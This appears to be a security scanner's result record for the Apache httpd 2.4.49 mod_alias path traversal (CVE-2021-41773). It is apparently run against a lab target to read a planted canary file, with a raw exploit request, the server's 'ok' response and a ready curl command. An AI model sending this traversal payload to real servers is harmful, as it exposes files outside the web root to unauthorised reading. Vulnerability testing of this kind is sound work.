info.name: httpd 2.4.49 mod_alias path traversal reads a per-run canary
author: aegis-g2b
info.description: Reads the canary file outside the document root through the mod_alias path-normalisation bug (CVE-2021-41773). Every target answers both requests and the canary is *extracted*, not matched, so the result file records the positive and the two negative controls explicitly (positive target, patched twin, and a path that never holds the canary).

request:
GET /static/.%2e/.%2e/srv/canary/canary.txt HTTP/1.1
Host: 10.114.59.90:8090
User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
response:
HTTP/1.0 200 OK
Connection: close
Content-Length: 3
Content-Type: text/html
Date: Sat, 28 Nov 2026 06:16:15 GMT
Server: BaseHTTP/0.6 Python/3.14.10

ok
curl-command: curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36' 'http://10.114.59.90:8090/static/.%2e/.%2e/srv/canary/canary.txt'
